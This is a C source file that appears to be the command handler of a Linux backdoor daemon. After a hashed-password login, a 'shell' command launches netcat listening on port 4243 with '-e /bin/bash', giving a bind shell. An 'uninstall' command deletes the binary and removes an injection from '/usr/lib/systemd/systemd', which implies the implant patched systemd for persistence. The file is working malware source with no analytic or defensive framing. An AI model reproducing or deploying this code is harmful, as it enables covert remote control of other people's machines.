#include "polling.h"
#include "daemon.h"
#include "woody.h"

bool is_password(char *password)
{
	uint8_t hash[32];
	sha256_string(password, hash);

	char *hash_str;
	if (!convert_hash_to_string(hash, 32, &hash_str))
		return false;

	bool res = (strcmp(hash_str, SHA256_PASS) == 0);
	free(hash_str);

	return res;
}

void shell_command(t_client *client)
{
	send_to_client(client, "Spawning a shell on 4243\n");
	int shell_pid = fork();
	if (shell_pid == 0)
	{
		char *argv[] = {"nc", "-l", "-p", "4243", "-e", "/bin/bash", NULL};
		execv("/usr/bin/nc", argv);
		perror("execv");
	}
}

void uninstall_command(t_client * client)
{
	if (access(BIN_PATH, F_OK) == 0)
	{
		send_to_client(client, "Remove binary from system...\n");
		bool success = unlink(BIN_PATH) == 0;
		send_to_client(client, success ? "Binary removed\n" : "Cannot unline binary\n");
	}
	else
	{
		send_to_client(client, "Binary is not installed\n");
	}

	send_to_client(client, "Removing injection...\n");
	int res = remove_injection("/usr/lib/systemd/systemd");
	if (res == -1)
	{
		send_to_client(client, "Cannot remove injection\n");
	}
	else if (res == 0)
	{
		send_to_client(client, "Injection removed\n");
	}
	else if (res == 1)
	{
		send_to_client(client, "No injection found\n");
	}

	send_to_client(client, "Shutdown...\n");
	disconnect_all();
	exit(0);
}

void help_command(t_client *client)
{
	send_to_client(client, "Available commands:\n");
	send_to_client(client, "shell: Spawns a shell on 4243\n");
	send_to_client(client, "help: Displays this help message\n");
	send_to_client(client, "uninstall: Remove binary and injection\n");
}

void treat_command(t_client *client, char *command)
{
	if (!client->authentified)
	{
		if (is_password(command))
		{
			client->authentified = true;
			send_to_client(client, "$> ");
		}
		else
		{
			send_to_client(client, "Wrong password\n");
			disconnect(client);
		}
	}
	else
	{
		if (strcmp(command, "shell") == 0)
			shell_command(client);
		else if (strcmp(command, "help") == 0)
			help_command(client);
		else if (strcmp(command, "uninstall") == 0)
			uninstall_command(client);
		else
			send_to_client(client, "Command not found\n");
		send_to_client(client, "$> ");
	}
}